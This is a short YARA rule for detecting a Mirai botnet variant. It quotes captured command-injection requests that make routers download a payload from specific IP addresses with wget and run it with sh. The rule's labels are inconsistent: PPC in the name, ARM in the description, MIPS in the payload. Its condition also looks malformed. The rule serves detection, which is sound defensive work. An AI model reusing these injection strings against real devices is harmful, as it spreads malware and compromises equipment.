rule Linux_PPC_Mirai_Variant_2022_03_18 {
  meta:
    description = "Detects new ARM Mirai variant"
    author      = "Mehmet Ali Kerimoglu a.k.a. CYB3RMX"
    date        = "2022-03-18"
    hash1       = "06e3d1eaaacf8bd63daedb8f112a9ec9f6bd3cd637808c4f564001869cad0f40"

  strings:
    $reqstr1 = "GET /ping.cgi?pingIpAddress=google.fr;wget%20http://104.244.77.57/bins/Rakitin.mips%20-O%20-%3E%20/tmp/jno;sh%20/tmp/jno%27/&sessionKey=1039230114'$ HTTP/1.1" wide ascii
    $reqstr2 = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://45.90.162.98/bins/Rakitin.sh+-O+/tmp/gaf;sh+/tmp/gaf`&ipv=0" wide ascii
    $reqstr3 = "45.90.162.98" wide ascii

  condition:
    uint16(0) == 0x457f and (3 or all of ($reqstr*))
}